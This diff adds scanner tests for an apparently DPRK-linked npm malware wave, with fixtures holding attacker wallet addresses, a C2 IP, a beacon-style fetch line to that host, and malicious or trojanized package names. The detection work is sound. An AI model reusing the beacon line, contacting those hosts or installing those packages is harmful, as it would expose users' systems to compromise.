@@ -4748,4 +4748,93 @@ describe("Campaign Signatures", () => {
     });
   });
 
+  // =================================================================
+  // NullReceiver / DPRK "Contagious Interview" npm wave (August 2026)
+  // =================================================================
+
+  describe("NullReceiver DPRK npm wave (August 2026)", () => {
+    it("should detect the hardcoded attacker wallet the loader queries", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "loader.js"),
+        'const S = "0xa322e5f3d311d3080e6f0121063e9adc2490ef1a";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_WALLET");
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect the dead-drop recipient address that encodes the C2 IP", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "resolve.js"),
+        'if (tx.to === "0xa658863ea658863e68656c6c6f6970626f742121") return decode(tx.to);'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_WALLET");
+      expect(finding).toBeDefined();
+    });
+
+    it("should still detect the C2 IP the recipient address decodes to", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "beacon.js"),
+        'const host = "166.88.134.62"; fetch("http://" + host + "/0x/ls");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP");
+      expect(finding).toBeDefined();
+    });
+
+    it("should NOT flag the public Ethereum RPC endpoints the payload reads through", async () => {
+      // 1rpc.io and eth.drpc.org are shared public infrastructure used by ordinary
+      // web3 code. Listing them would flag every legitimate Ethereum project.
+      fs.writeFileSync(
+        path.join(tempDir, "rpc.js"),
+        'const R = ["https://1rpc.io/eth", "https://eth.drpc.org"];'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN" || f.rule === "IOC_KNOWN_DEAD_DROP"
+      );
+      expect(finding).toBeUndefined();
+    });
+
+    it("pins only the trojanized agentgui release and leaves the clean ones alone", () => {
+      const feed = getBundledFeed();
+
+      expect(
+        matchBareNpmIOC("agentgui", "1.0.1127", feed),
+        "agentgui@1.0.1127 must resolve as an npm IOC",
+      ).toBeTruthy();
+
+      // agentgui has 1,110 published versions and a real purpose. If any of these
+      // resolve, the pin has silently widened into a name-level block on a package
+      // whose publisher was the victim of the compromise.
+      for (const version of ["1.0.1120", "1.0.1125", "1.0.1126"]) {
+        expect(
+          matchBareNpmIOC("agentgui", version, feed),
+          `agentgui@${version} predates the trojanized publish`,
+        ).toBeNull();
+      }
+    });
+
+    it("blocks the two fully-malicious names by name", () => {
+      const feed = getBundledFeed();
+
+      // matchBareNpmIOC, not matchPackageIOC: a bare feed value means the npm
+      // namespace, and matchPackageIOC only resolves explicitly prefixed values.
+      // Asserting through the npm matcher is what proves these two landed in the
+      // npm namespace rather than somewhere a scanner never reaches.
+      for (const name of ["scrollbar-hide-plugin", "tailwind-animation-founder"]) {
+        expect(
+          matchBareNpmIOC(name, "1.0.0", feed),
+          `${name} must resolve as an npm IOC at any version`,
+        ).toBeTruthy();
+      }
+    });
+  });
+
 });
